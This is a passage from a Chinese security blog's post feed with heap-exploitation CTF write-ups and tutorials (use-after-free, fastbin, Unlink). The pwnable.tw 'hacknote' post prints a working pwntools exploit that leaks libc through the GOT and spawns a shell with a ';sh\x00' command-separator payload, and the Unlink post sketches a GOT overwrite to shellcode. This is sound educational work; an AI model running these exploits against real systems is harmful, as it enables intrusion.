Up以及EXP代码的时候会一头雾水，很多地方不知道为什么要这么写。</p><p>这道题还有64位版本，思路和32位一模一样，只是一些offset根据libc的变化而变化，有兴趣的可以参照32位程序再巩固一下。</p><p>最后说一下这道题给我的收获：纸上得来终觉浅，绝知此事要躬行。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Heap </tag>
            
            <tag> XMAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw - hacknote の Write-Up</title>
      <link href="/2020/07/09/Hacknote/"/>
      <url>/2020/07/09/Hacknote/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><a href="https://pwnable.tw/">pwnable.tw</a>是一个pwn题刷题网站，里面收集了很多不错的pwn题。hacknote是一道比较简单的堆溢出的题目，刚好适合开始接触堆溢出不久的rookie，能够帮助理解和掌握有关堆溢出利用相关知识。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>首先运行程序：</p><p><img src="/img/Hacknote/Hacknote1.png"></p><p>看起来是一个日记本程序，可以添加、删除、打印日记，标准的堆溢出题目。</p><p>checksec：</p><p><img src="/img/Hacknote/Hacknote2.png"></p><p>32位程序，栈上的保护还是比较齐全的。</p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>将程序丢到hopper中，首先看一下主函数：</p><p><img src="/img/Hacknote/Hacknote3.png"></p><p>函数逻辑还是比较简单的，首先是菜单的显示：</p><p><img src="/img/Hacknote/Hacknote4.png"></p><p>然后是对各个功能的处理函数，首先是功能1添加note：</p><p><img src="/img/Hacknote/Hacknote5.png"></p><p>Add函数首先会判断目前note的数量，如果超过5，那么会显示’Full’然后退出。如果没有超过5会从0开始遍历，直到找到一个空的项，申请一个8字节的堆块。如果分配错误，返回’Alloca Error’并退出，分配成功则将储存一个指针指向0x804862b，另一个指针指向note的内容，而0x804862b位置是一个输出note内容的函数sub_804862b：</p><p><img src="/img/Hacknote/Hacknote6.png"></p><p>之后根据读入的size大小申请一个堆块，再读入字符串为内容，最后将note的计数加1。</p><p>然后是对功能2删除note的处理函数：</p><p><img src="/img/Hacknote/Hacknote7.png"></p><p>Delete函数相对就比较简单了，判断一下要读入的要删除note的编号是否符合范围要求，再判断一下编号对应的note有没有，如果没有就返回‘Out of bound!’，如果有就free对应的note。</p><p>接着是功能3打印note：</p><p><img src="/img/Hacknote/Hacknote8.png"></p><p>Print函数和Delete函数很像，只是最后是调用Add函数中的sub_804862b函数输出指定的编号对应的note的内容。</p><p>最后是退出程序：</p><p><img src="/img/Hacknote/Hacknote9.png"></p><p>程序的逻辑比较简单，通过逆向的伪代码基本已经了解透彻了。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>程序逻辑流程明白之后，就是要在其中找漏洞。这一题的漏洞点在于Delete函数释放指针之后没有将其值清空，这样会出现Use After Free和Double Free漏洞。关于这两个漏洞的原理和利用网上资料比较多，也可以参考我之前的文章<a href="https://coldwave96.github.io/2020/07/07/HeapOverflow/">堆溢出漏洞小结</a>。</p><p>首先要明确利用漏洞需要获得什么结果：</p><ul><li><p>需要知道程序运行时system函数实际地址；</p></li><li><p>获取诸如’&#x2F;bin&#x2F;sh’的字符串的位置；</p></li><li><p>控制程序的运行流。</p></li></ul><p>下面从漏洞利用的角度再来细细品一下这个程序。</p><p>每个note生成时程序会申请8字节的堆块来存放该note的指向sub_804862b函数的指针和指向内容的指针。然后程序会根据输入的size大小来申请合适大小的堆块用来存储note的内容。</p><p>显然note的结构是一个fastbin chunk，大小是16字节，至于为什么是16字节可能需要先去了解下堆的机制，可以参考下<a href="https://coldwave96.github.io/2020/07/02/Heap-bin/">关于堆的bin结构的理解</a>和<a href="https://coldwave96.github.io/2020/06/30/Heap/">堆溢出入门基础知识</a>。</p><p>我们的目的是控制程序的运行流去执行system等函数，那么我们可以考虑修改某个note的指向sub_804862b函数的指针，将其修改为我们想要执行的函数地址。这样当执行print函数的功能时程序就回去执行我们想要执行的函数。</p><p>既然我们需要修改某个note的指针，而程序中只有唯一的方法可以赋值，所以我们必须在Add note中利用写入note内容的功能来进行覆盖。</p><p>具体思路如下：</p><ul><li><p>申请note0，size为20（大小与note大小所在的bin不一样就可以）；</p></li><li><p>申请note1，size为20；</p></li><li><p>Delete note0；</p></li><li><p>Delete note1；</p></li><li><p>申请note2， size为8（此时根据fastbin的LIFO策略，其实note2分配的是note1，而note2的size则是对应的note0）；</p></li><li><p>这时我们输入的note2的内容其实就覆盖了note0的指向sub_804862b函数的指针和指向note0的内容的指针；</p></li><li><p>所以当Print note0的时候，程序就会去调用覆盖的函数。</p></li></ul><p>这样我们就解决了控制程序运行流的问题。</p><p>接下来就是获取程序运行时system函数在内存中的实际地址。可以看到题目给了libc文件，那么可以像栈溢出那样泄露libc基址加上offset获得system函数的地址。</p><p>具体思路如下：</p><ul><li><p>将note0的指向内容的指针覆盖为puts函数在got表的地址；</p></li><li><p>Print note0就可以打印出read的实际地址；</p></li><li><p>利用system_addr - system_libc &#x3D; puts_addr - puts_libc计算出system_addr；</p></li></ul><p>最后是system函数的参数，由于一共只有8字节，除去system函数的地址只有4字节，所以选择写入字符串’sh’或者’$0’。</p><p>但是这里还有个小问题，Print函数是将note0的8字节结构的地址当作参数传递给system函数的，所以前半部分的system函数地址也会被当作参数导致system函数执行时报错。</p><p>所以需要进行system参数截断，可以使用如下的方式：</p><ul><li><p>‘;sh\x00’ or ‘;$0\x00’</p></li><li><p>‘&amp;&amp;sh’ or ‘&amp;&amp;$0’</p></li><li><p>‘||sh’ or ‘||$0’</p></li></ul><p>到这里这题的解题思路就梳理完毕了，之后就是EXP的编写了。</p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>直接给出EXP脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10102</span>)</span><br><span class="line"><span class="comment"># sh = process(&#x27;./hacknote&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">size, content</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Note size :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Content :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params">index</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_note</span>(<span class="params">index</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">print_puts = <span class="number">0x0804862b</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">20</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add_note(<span class="number">20</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">0x8</span>, p32(print_puts) + p32(puts_got))</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">puts_libc = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_libc = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sys_addr = puts_addr - puts_libc + sys_libc</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">add_note(<span class="number">0x8</span>, p32(sys_addr) + <span class="string">&#x27;;sh\x00&#x27;</span>)</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>脚本运行结果：</p><p><img src="/img/Hacknote/Hacknote10.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> pwnable.tw </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆溢出漏洞小结</title>
      <link href="/2020/07/07/HeapOverflow/"/>
      <url>/2020/07/07/HeapOverflow/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>总结一些堆溢出漏洞利用姿势。</p><span id="more"></span><h2 id="姿势1：Off-By-One"><a href="#姿势1：Off-By-One" class="headerlink" title="姿势1：Off By One"></a>姿势1：Off By One</h2><p>Off By One指程序向缓冲区中写入时，写入的字节数超过程序申请的字节数并且只越界一个字节。</p><p>出现这种漏洞主要有两个原因：</p><ul><li><p>边界验证不严，例如使用循环语句向堆块中写入数据时，循环次数设置错误导致多写入了一个字节；</p></li><li><p>字符串操作不合适，例如strlen函数计算字符串长度时是不考虑结束符’\x00’的，而strcpy复制字符串的时候会拷贝结束符’\x00’，函数使用不当会导致向堆中多写入一个字。</p></li></ul><h2 id="姿势2：Unsorted-Bin-Attack"><a href="#姿势2：Unsorted-Bin-Attack" class="headerlink" title="姿势2：Unsorted Bin Attack"></a>姿势2：Unsorted Bin Attack</h2><p>Unsorted Bin Attack攻击实现的前提是控制Unsorted Bin Chunk的bk指针，利用该漏洞可以实现修改任意地址值为一个较大的数值。</p><p>Unsorted Bin Attack攻击可以实现修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以确定的是这个值比较大。</p><p>通过这个漏洞我们可以实现：</p><ul><li><p>修改循环次数使得程序可以执行多次循环；</p></li><li><p>修改heap中的global_max_fast使得更大的chunk被视为fast bin，然后实现Fastbin Attack。</p></li></ul><h2 id="姿势3：Use-After-Free"><a href="#姿势3：Use-After-Free" class="headerlink" title="姿势3：Use After Free"></a>姿势3：Use After Free</h2><p>Use After Free字面意思是当一个内存块被释放之后被再次使用，实际情况有：</p><ul><li><p>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</p></li><li><p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</p></li><li><p>内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</p></li></ul><p>Use After Free漏洞一般指后两种情况，被释放后没有被设置为NULL的内存指针一般被称为dangling pointer。</p><h2 id="姿势4：Chunk-Extend-and-Overlapping"><a href="#姿势4：Chunk-Extend-and-Overlapping" class="headerlink" title="姿势4：Chunk Extend and Overlapping"></a>姿势4：Chunk Extend and Overlapping</h2><p>通过Chunk Extend实现Chunk Overlapping。实现Chunk Extend需要程序中存在基于堆的漏洞，利用之后可以实现控制chunk header中的数据。</p><h2 id="姿势5：Fastbin-Attack"><a href="#姿势5：Fastbin-Attack" class="headerlink" title="姿势5：Fastbin Attack"></a>姿势5：Fastbin Attack</h2><p>Fastbin Attack是指基于fastbin机制的一类漏洞利用方法，这类漏洞的利用前提是：</p><ul><li><p>存在堆溢出、Use After Free等能控制chunk内容的漏洞；</p></li><li><p>漏洞发生于fastbin类型的chunk中。</p></li></ul><p>细分可以分为：</p><ul><li><p>Fastbin Double Free</p></li><li><p>House of Spirit</p></li><li><p>Alloc to Stack</p></li><li><p>Arbitrary Alloc</p></li></ul><p>前两种主要漏洞侧重于利用free函数释放真的chunk或伪造的chunk，然后再次申请chunk进行攻击，后两种侧重于故意修改fd指针，直接利用malloc申请指定位置chunk进行攻击。</p><h3 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h3><p>Fastbin Double Free指fastbin中的chunk多次释放。根据fastbin的LIFO策略，多次分配的都是同一个堆块。这样相当于多个指针指向同一个堆块，结合该堆块的数据可以实现类型混淆的效果。</p><p>Fastbin Double Free漏洞利用原理：</p><ul><li><p>fastbin的堆块被释放后next_chunk的pre_inuse位不会清空；</p></li><li><p>fastbin在free时仅验证main_arena直接指向的堆块，也即链表头部的堆块，而没有验证堆表后面的堆块。</p></li></ul><p>当释放chunk1后，再释放chunk2，这时main_arena指向chunk2，所以可以再次释放chunk1。此时chunk1的fd仍旧指向chunk2且不会被清空，如果我们可以控制chunk1的数据，便可以写入fd指针实现指定任意地址分配fastbin堆块，这样就相当于实现了在任意地址写入任意值的效果。</p><h3 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h3><p>House of Spirit是在目标位置处伪造fastbin chunk并将其释放，从而实现在指定地址处分配chunk。但是需要能够控制指定地址的内容，并在指定地址布局好fake chunk的结构且fake chunk需要满足堆的检验机制。</p><h3 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h3><p>Alloc to Stack技术是劫持fastbin链表中chunk的fd指针，将该指针指向想要分配的栈上，从而实现控制栈中的关键数据，档案栈上需要存在有满足条件的size值。</p><h3 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h3><p>Arbitrary Alloc技术和Alloc to Stack技术其实一样，只不过Arbitrary Alloc不再局限于栈中，只要任意的目标地址存在满足条件的size域即可。</p>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> Assembler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于堆的bin结构的理解</title>
      <link href="/2020/07/02/Heap-bin/"/>
      <url>/2020/07/02/Heap-bin/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>用户申请堆空间是通过malloc函数实现的，而malloc在内核中对应的是ptmalloc。ptmalloc像是内核和用户的中间商，中间商向卖家（操作系统内核）要大量的货物（大块内存空间），然后分配给买家（用户程序）。同样的，当用户释放chunk的时候，也不是直接归还给系统，而是被ptmalloc所管理。当用户在一次请求内存空间的时候，ptmalloc会在空闲的chunk中选择合适大小的分配给用户。这种机制的好处在于可以避免频繁的系统效用，降低内存分配的开销，提高效率。</p><p>而ptmalloc正是通过bin结构来管理空闲堆块。它会根据空闲chunk的大小及使用状态将chunk分为4类：fast bin，small bin，large bin和unsorted bin。</p><span id="more"></span><h2 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h2><p>对于size较小的chunk，释放之后单独处理，被放入fast bin中。</p><ul><li><p>32位系统，fast bin中的chunk大小范围在16字节到64字节；</p></li><li><p>64位系统，fast bin中的chunk大小范围在32字节到128字节。</p></li></ul><p>fast bin链表采用单向链表进行连接，并且每个bin采取了LIFO策略，最近释放的chunk会被更早地分配。所以当用户申请的chunk大小在fast bin范围内时，ptmalloc会首先判断fast bin中是否有对应大小的空闲chunk，有的话就会直接分配出去。</p><p>fast bin范围内chunk的inuse标志位始终被置为1，即它们不会和其他被释放的chunk合并，也就不会触发Unlink操作。</p><p>fastbin链表最末端的块fd域为0，此后每个块的fd域指向前一个块。因此通过fastbin只能泄漏heap的基地址。</p><h2 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h2><p>small bin中chunk大小范围的序号index从2到63，总共62个循环双向链表。</p><p>每个chunk的size大小用一个关系式表达是：<code>chunk_size = 2 * SIZE_SZ（4 or 8）* index</code></p><p>从关系式可以看出每个链表中的chunk大小是一样的，这也是堆中堆表的数据结构。并且可以发现small bin中的chunk_size与fast bin有重复，这仅是大小重复，而不是chunk重复。fast bin中的chunk也有可能被放到small bin中去。</p><p>此外small bin中每个bin对应的链表采用FIFO策略，所以同一个链表中先被释放的chunk会被先分配。</p><p>通过smallbin可以获得：</p><ul><li><p>1.libc.so的基地址；</p></li><li><p>2.heap基地址。</p></li></ul><h2 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h2><p>large bin也是遵循FIFO策略的循环双向链表，一共有63个bin，每个bin中的chunk大小不一致，但处于一定区间范围内。32位系统中chunk_size &gt;&#x3D; 512字节。</p><h2 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h2><p>unsorted bin可以看作空闲chunk回归其所属bin之前的缓冲区，该bin只有一个遵循FIFO策略的循环双向链表，且其中的free chunk处于乱序状态。unsorted bin暂时存储free后的chunk，一段时间后会将chunk放入对应的bin中去。</p><p>通过unsorted bin我们可以获取到某个堆块的地址和main_areana的地址。一旦获取到某个堆块的地址就可以通过malloc的size进行计算从而获得堆基地址。一旦获取到main_arena的地址，因为main_arena存在于libc.so中就可以计算偏移得出libc.so的基地址。</p><p>因此，通过unsorted bin可以获得：</p><ul><li><p>1.libc.so的基地址；</p></li><li><p>2.heap基地址。</p></li></ul><h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><p>可以实现泄露的漏洞：</p><ul><li><p>堆内存未初始化</p></li><li><p>堆溢出</p></li><li><p>Use-After-Free</p></li><li><p>越界读</p></li><li><p>heap extend</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> Assembler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink原理和简单利用</title>
      <link href="/2020/07/01/Unlink/"/>
      <url>/2020/07/01/Unlink/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Unlink机制的利用是堆溢出中很常见的手段，这里记录一下自己的理解。</p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用Unlink机制实现堆溢出攻击是通过对chunk进行布局，借助内存回收机制触发Unlink操作形成攻击。</p><p>首先了解一下Unlink操作。Unlink实现将一个双向链表中的空闲块拿出来，然后与目前物理相邻的chunk进行合并。</p><p>基本过程套用CTF Wiki的经典图示：</p><p><img src="/img/Unlink/Unlink1.png"></p><p>chunk的合并分为向前和向后合并，这里的前和后都是指在物理内存中的位置，而不是fd和bk链表所指的堆块。以当前chunk为基准，将previous free chunk合并到当前chunk称为向后合并，将next free chunk合并到当前chunk称为向前合并。</p><p>向后合并流程：</p><ul><li><p>首先检测前一个chunk是否为free状态，通过检测previous chunk的PREV_INUSE(P)标志位，如果为0表示free状态。但内存中第一个申请的chunk的前一个chunk一般都被认为在使用中不会发生向后合并；</p></li><li><p>如果不是内存中的第一个chunk且它的前一个chunk标记为free状态时，发生向后合并；</p></li><li><p>首先修改chunk的size位大小为两个chunk size之和；</p></li><li><p>再将指针移动到前一个chunk处；</p></li><li><p>最后调用unlink将前一个chunk从它所在的链表中移除。</p></li></ul><p>向前合并也会做相应的标志位检测，判断需要向前合并的时候，只改变size的大小，而不改变指针。</p><h2 id="理想情况下的简单利用"><a href="#理想情况下的简单利用" class="headerlink" title="理想情况下的简单利用"></a>理想情况下的简单利用</h2><p>以32位程序为例，如果有两个相邻的chunk，在第一个chunk写入数据的时候存在溢出。此时内存示意图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">low address</span><br><span class="line">+---------------------+   &lt;--first chunk ptr</span><br><span class="line">|     prev_size       |</span><br><span class="line">+---------------------+</span><br><span class="line">|        size         |          </span><br><span class="line">+---------------------+   &lt;--first                  </span><br><span class="line">|                     |</span><br><span class="line">|     allocated       |         </span><br><span class="line">|      chunk          |      </span><br><span class="line">+---------------------+   &lt;--second chunk ptr                </span><br><span class="line">|    prev_size        |         </span><br><span class="line">+---------------------+                     </span><br><span class="line">|         size        |         </span><br><span class="line">+---------------------+   &lt;--second                  </span><br><span class="line">|     Allocated       |         </span><br><span class="line">|       chunk         |     </span><br><span class="line">+---------------------+ </span><br><span class="line">high address     </span><br></pre></td></tr></table></figure><p>这时候我们将nextchunk的fd和bk指针修改为指定的值：size修改为<code>-4</code>即<code>0xfffffffc</code>，fd修改为<code>target_addr - 12</code>，bk修改为<code>shellcode_addr</code>。</p><p>覆盖后的内存示意图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">low address</span><br><span class="line">+---------------------+   &lt;--first chunk ptr</span><br><span class="line">|     prev_size       |</span><br><span class="line">+---------------------+</span><br><span class="line">|        size         |          </span><br><span class="line">+---------------------+   &lt;--first                  </span><br><span class="line">|                     |</span><br><span class="line">|     allocated       |         </span><br><span class="line">|      chunk          |      </span><br><span class="line">+---------------------+   &lt;--second chunk ptr                </span><br><span class="line">|    XXXXXXXXX        |         </span><br><span class="line">+---------------------+                     </span><br><span class="line">|   size=0xfffffffc   |         </span><br><span class="line">+---------------------+   &lt;--second   </span><br><span class="line">|     exit@got-12     |  </span><br><span class="line">|    shellcode_addr   |               </span><br><span class="line">|     Allocated       |         </span><br><span class="line">|       chunk         |     </span><br><span class="line">+---------------------+      </span><br><span class="line">high address</span><br></pre></td></tr></table></figure><p>当我们free第一个chunk的时候：</p><ul><li><p>判断向前合并，此时由于第一个chunk的前一个chunk总是处于使用状态，即使根本不存在，故而转为判断向后合并；</p></li><li><p>判断的方法是检查下下个chunk的<code>PREV_ISUSE</code>标志位。即当前chunk加上当前size得到下个chunk，下个chunk加上下个size得到下下个chunk，因为我们设置下个chunk大小为<code>-4</code>，则下个chunk的<code>pre_size</code>位置被认为是下下个chunk的开始，下个size位置是<code>0xfffffffc</code>标志未置位，被认为是free所以转而对后一个chunk采取Unlink操作。</p></li></ul><p>此时根据上面Unlink操作的图示，一步一步分析下情况：</p><ul><li><p><code>FD = P -&gt; fd = target_addr - 12</code>；</p></li><li><p><code>BK = P -&gt; bk = shellcode_addr</code>；</p></li><li><p><code>FD -&gt; bk = BK</code>，即<code>P -&gt; fd -&gt; bk = BK</code>，表示shellcode的地址被写进了<code>P -&gt; fd -&gt; bk</code>位置，而这里实际是<code>P -&gt; fd + 12</code>的位置。因为<code>P -&gt; fd</code>指向的是前一个chunk的头部，加12是跳过<code>prev_size</code>、<code>size</code>和<code>fd</code>，到达<code>bk</code>的位置。而<code>P -&gt; fd = target_addr - 12</code>，所以<code>shellcode_addr</code>实际被写到了<code>target_addr</code>的位置；</p></li><li><p><code>BK -&gt; fd = FD</code>，即<code>P -&gt; bk -&gt; fd = FD</code>，表示<code>target_addr - 12</code>被写到<code>P -&gt; bk -&gt; fd</code>位置，，而这里实际是<code>P -&gt; bk + 8</code>的位置。因为<code>P -&gt; bk</code>指向的是第二个chunk的头部，加8是跳过<code>prev_size</code>和<code>size</code>到达<code>fd</code>。而<code>P -&gt; bk + 8</code>实际是<code>shellcode_addr + 8</code>的位置，即<code>target_addr - 12</code>被写到<code>shellcode_addr + 8</code>处。所以这里需要注意两点，一是需要确保<code>shellcode_addr + 8</code>地址具有可写的权限；二是<code>shellcode_addr + 8</code>处的值其实是被破坏的，需要想办法绕过这里。</p></li></ul><p>如果我们将<code>target_addr</code>设置为某个函数got表地址，那么当程序调用这个函数的时候，会直接执行<code>shellcode_addr</code>处的代码。</p><p>这样我们就通过Unlink实现了任意地址读写，看起来很完美，但是这是在没有任何检查的情况下才能实现的。</p><h2 id="残酷现实"><a href="#残酷现实" class="headerlink" title="残酷现实"></a>残酷现实</h2><p>理想很美好，现实很残酷。实际上Unlink操作时会进行一系列的检测：</p><ul><li><p>Double Free检测：该机制不允许释放一个已经处于free状态的chunk。因此，当攻击者将second chunk的size设置为-4的时候，就意味着该size的PREV_INUSE位为0，也就是说second chunk之前的first chunk(我们需要free的chunk)已经处于free状态，那么这时候再free(first)的话，就会报出double free错误。</p></li><li><p>next size非法检测：该机制检测next size是否在8到当前arena的整个系统内存大小之间。因此当检测到next size为-4的时候，就会报出invalid next size错误。</p></li><li><p>双链表冲突检测：该机制会在执行Unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要Unlink的chunk。这样攻击者就无法替换second chunk的fd与fd了。</p></li></ul><p>所以前路遥远，只能埋头学习。</p>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> Assembler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆溢出入门基础知识</title>
      <link href="/2020/06/30/Heap/"/>
      <url>/2020/06/30/Heap/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天在看堆溢出相关的资料，这里简单做个小结。不是很全面，仅仅列出一些相对比较重要的内容。</p><span id="more"></span><h2 id="堆的概念"><a href="#堆的概念" class="headerlink" title="堆的概念"></a>堆的概念</h2><p>堆是由程序员自行申请和释放的内存区块，分别通过malloc和free函数实现。根据Linux系统的内存管理机制，堆其实是程序虚拟地址空间的一块连续的线性区域。与栈相反，堆由内存低地址向高地址方向增长，但是由于两者起始地址相距很远，所以基本不会出现交汇的现象。</p><h2 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h2><p>在程序的执行过程中，由malloc申请的内存称为chunk，这块内存在ptmalloc内部用malloc_chunk结构体表示。</p><p>一个malloc_chunk结构如下：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> malloc_chunk &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> malloc_chunk* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> malloc_chunk* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  